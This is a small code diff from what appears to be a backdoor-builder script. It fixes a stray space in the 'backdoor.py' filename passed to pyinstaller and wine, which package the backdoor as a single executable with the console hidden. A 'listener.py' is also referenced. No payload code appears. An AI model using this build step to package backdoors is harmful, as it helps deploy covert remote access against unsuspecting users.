@@ -65,10 +65,10 @@ with open('listener.py', "w") as f:
 
 
 def compile_for_windows():
-    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", " backdoor.py"])
+    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", "backdoor.py"])
 
 def compile_for_linux():
-    subprocess.call(["pyinstaller", "--onefile", "--noconsole", " backdoor.py"])
+    subprocess.call(["pyinstaller", "--onefile", "--noconsole", "backdoor.py"])
 
 if arguments.windows:
 	compile_for_windows()
